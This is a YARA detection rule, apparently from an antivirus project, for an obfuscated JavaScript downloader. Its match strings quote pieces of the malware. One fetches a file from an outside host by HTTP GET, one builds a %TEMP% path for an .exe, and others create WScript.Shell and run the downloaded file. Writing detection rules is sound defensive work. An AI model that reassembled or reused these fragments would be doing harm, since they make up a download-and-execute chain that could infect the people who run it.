rule sig_20160328_a501538f2a2873eac2d6936026a2dd1f {
  meta:
    description = "datamaliciousorder - file 20160328_a501538f2a2873eac2d6936026a2dd1f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dc8345a90513dbb67b654639991887ceced341f012dd12d22e31d17e20ceb0ad"

  strings:
    $s1  = "function Icftwxzn() {return Fzywwmgp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QZR9K43K.exe\";};" fullword ascii
    $s2  = "Nwnvun[Vvkue](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Qdycqwaa](Jwugzzetc() * 11)} while (Nwnvun[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fzywwmgp = function Qjzjdgsjbr() {return WScript[Eoexy](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ardkmpeiy(Arjixuwgb, Xndytquwn){return Arjixuwgb - Xndytquwn;};" fullword ascii
    $s6  = "function Gemxowc() {return ((Anuxnwufmq == true) && (Anuxnwufmq == Jqemi)) ? 1 : Ysevplwk;};" fullword ascii
    $s7  = "function Qllifoiym(Xtrbehabsn){Fzywwmgp[\"Run\"](Xtrbehabsn, Ysevplwk, Ysevplwk);};" fullword ascii
    $s8  = "Jqemi = true; " fullword ascii
    $s9  = "var Jqemi = false;" fullword ascii
    $s10 = " while (Fgfrxp){" fullword ascii
    $s11 = "function Cdspug(){return Eoexy;};" fullword ascii
    $s12 = "return Ardkmpeiy(Ilrpuzfvn, Cvsensu);" fullword ascii
    $s13 = "function Etcpqczaxd(){return Wvgnolxvf;};" fullword ascii
    $s14 = "var Xuaozupsbe = false;" fullword ascii
    $s15 = "Anuxnwufmq = true; " fullword ascii
    $s16 = "function Jwugzzetc(){return 22;};" fullword ascii
    $s17 = "var Anuxnwufmq = false;" fullword ascii
    $s18 = "function Mmgae()" fullword ascii
    $s19 = "var Teatimu = new this[\"Date\"]();" fullword ascii
    $s20 = "function Msmazocze(Umgtxz) {var Ecrlyzrwy = (1, 2, 3, 4, 5, Umgtxz); return Ecrlyzrwy;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}